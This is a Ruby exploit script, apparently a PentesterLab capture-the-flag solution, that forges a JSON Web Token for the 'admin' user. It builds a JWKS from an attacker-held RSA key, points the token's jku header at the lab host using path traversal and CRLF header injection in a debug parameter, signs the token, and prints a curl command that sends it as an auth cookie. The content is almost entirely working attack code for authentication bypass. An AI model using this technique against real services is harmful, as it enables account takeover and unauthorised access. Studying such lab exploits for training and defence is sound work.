#header = eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9wdGwtOTUwZTJmMjllMzFlLTYwMmYzZGE3MjMzZC5saWJjdXJsLm1lLy53ZWxsLWtub3duLy9qd2tzLmpzb24ifQ
#payload = .eyJ1c2VyIjoiaGFja2VyIn0
#uh =  .HhTDXDX2tX5nStRJAFmlkPHhg23dUJaYGyLAjuKY3gUsR3_RG53eDkXgmz8g8TYCyyJ7Zp_PLkRPAI0XBAOJCVW8NblpOw7evfYoXyMM1RJHoRmZ0Cm02jXz-mwF0m-ISxZuHzfSzoiPA7eyoDlQn6yDioN3_w2gxblWpk209OYxvvPAvBdLHdRJ4ooWlR4jZJrteFF2n1gh7nnN0A84tzYyVTXCXdfbzQOk57PEDE-3Wb-FOUhz78XQdhYBEtwyoi0Cn1z0SW7__YO_6HijmMZNesBkq9HbXECHqiL_F33ryYBXVc7RiyOsGPQ-m36K_6w0YNcbMtn3VLsjHPV5cg
header = {"typ":"JWT","alg":"RS256","jku":"http://ptl-5cf594e18e7b-fe24f0700f7a.libcurl.me/.well-known//jwks.json"}
body = {"user":"admin"}
require 'openssl'
require 'json'
require 'base64'
require 'uri'


k = OpenSSL::PKey::RSA.new File.read "private.pem"

pub = k.public_key
e = Base64.urlsafe_encode64(pub.e.to_s(2), padding: false)
n =  Base64.urlsafe_encode64(pub.n.to_s(2), padding: false)
jwks = {
    "keys" => [
      {
        "kty"=> "RSA",
        "use"=> "sig",
        "kid"=> "pentesterlab",
        "n"=> n,
        "e"=> e,
        "alg"=> "RS256"
      }
    ]
  }
jwk = JSON.dump jwks
len = jwk.size
puts jwk




url = "http://ptl-5cf594e18e7b-fe24f0700f7a.libcurl.me/.well-known/../debug?value=1337%0d%0aContent-Length:+#{len}%0d%0a%0d%0a#{URI.escape(jwk, "[]{}")}"
header["jku"]=url
data = Base64.urlsafe_encode64(body.to_json).gsub("=","")
head = Base64.urlsafe_encode64(header.to_json).gsub("=","")
sig = k.sign("SHA256", head+"."+data)
puts head+"."+data+"."+sig

puts "curl -H 'Cookie: auth=#{head+"."+data+"."+Base64.urlsafe_encode64(sig).gsub("=","")}' http://ptl-5cf594e18e7b-fe24f0700f7a.libcurl.me/"
